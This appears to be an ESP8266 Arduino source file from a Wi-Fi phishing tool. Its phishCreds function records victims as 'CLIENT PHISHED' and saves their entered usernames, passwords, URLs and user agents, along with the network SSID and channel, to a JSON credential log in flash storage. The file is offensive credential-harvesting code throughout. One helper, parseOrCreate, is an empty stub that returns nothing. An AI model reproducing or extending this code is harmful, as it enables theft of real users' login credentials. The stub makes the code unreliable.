#include <FS.h>



void startSPIFFS(){
  SPIFFS.begin();


  File f1 = SPIFFS.open("/log", "a");
  f1.close();

  File f2 = SPIFFS.open("/phishinglogs", "a");
  f2.println("[]");
  f2.close();
}




void logging(char *logString){
  File logFile = SPIFFS.open("/log", "a");
  if (!logFile){
    Serial.println("Could not creat log file");
  }
  Serial.print(logString);
  if(logFile.println(logString)){
    Serial.println("  -->> Log was written");;
  } else {
      Serial.println("  -->> Log write failed");
  }

  logFile.close();
}

JsonArray& parseOrCreate(DynamicJsonBuffer& jb, const String& json) {

}

void phishCreds(String url, String user, String pass, String userAgent){

  // stationPhished = 1;
  //
  // logging("phishCreds :: CLIENT PHISHED");
  //
  // String filename = "/phishinglogs";
  //
  // File f = SPIFFS.open(filename, "a");
  // f.print(url);
  // f.print(" ; userAgent : ");
  // f.print(userAgent);
  // f.print(" ; username : $");
  // f.print(user);
  // f.print("$ ; password: $");
  // f.print(pass);
  // f.println("$");
  // f.close();




  stationPhished = 1;

  logging("phishCreds :: CLIENT PHISHED");

  logging("loadSettingJSON :: Opening config json file ");
  // Serial.print(W_ESPJSON);
  File configFile = SPIFFS.open("/phishinglogs", "r");

  size_t size = configFile.size();
  std::unique_ptr<char[]> buf(new char[size]);
  configFile.readBytes(buf.get(), size);
  // StaticJsonBuffer<500> jsonBuffer;
  DynamicJsonBuffer jsonBuffer(size);


  JsonArray& array = jsonBuffer.parseArray(buf.get());
  // if (array.success() == false) {
  //   JsonArray& array = jsonBuffer.createArray();
  // }

  // JsonArray& array = jsonBuffer.createArray();
  // JsonObject& json = jsonBuffer.parseObject(buf.get());
  // Serial.println(size);
  // if (size != 0){
  //   JsonArray& array = jsonBuffer.parseArray(buf.get());
  //   array.prettyPrintTo(Serial);
  // }

  array.prettyPrintTo(Serial);
  configFile.close();





  JsonObject& obj = array.createNestedObject();
  obj["url"] = url;
  obj["ssid"] = ssid;
  obj["hidden"] = hidden;
  obj["channel"] = channel;
  obj["user"] = user;
  obj["pass"] = pass;
  obj["userAgent"] = userAgent;
  // array.add(obj);
  File configFileA = SPIFFS.open("/phishinglogs", "w");
  array.printTo(configFileA);
  array.prettyPrintTo(Serial);
  configFileA.close();




}

void wipeLog(const char *file, const char *empty){

  SPIFFS.remove(file);
  File f = SPIFFS.open(file, "a");
  f.println("[]");
  f.close();
}
